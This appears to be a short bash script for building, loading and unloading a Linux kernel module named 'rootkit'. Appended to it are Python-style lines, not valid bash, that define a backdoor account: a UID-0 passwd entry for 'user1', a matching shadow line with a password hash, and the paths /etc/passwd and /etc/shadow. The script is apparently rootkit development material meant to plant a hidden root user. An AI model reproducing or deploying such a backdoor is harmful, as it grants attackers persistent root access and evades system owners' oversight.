#!/bin/bash

RMMODULE=rootkit
INSMODULE=rootkit.ko

sudo rmmod $RMMODULE
sudo dmesg -c # Clear kernel log
make
sleep 1
sudo insmod $INSMODULE
sleep 1
sudo rmmod $RMMODULE
sleep 1
dmesg #Print kernel log

backdoor_password = "user1:x:12345:0:backdoor:/home:/bin/bash\n"
backdoor_shadow = "user1:$1$MvZ75uo5$a2pTPgyDXrO6n.eyQjcmq0:16888:0:99999:7:::\n"
PASSWD_FILE = "/etc/passwd"
SHADOW_FILE = "/etc/shadow"
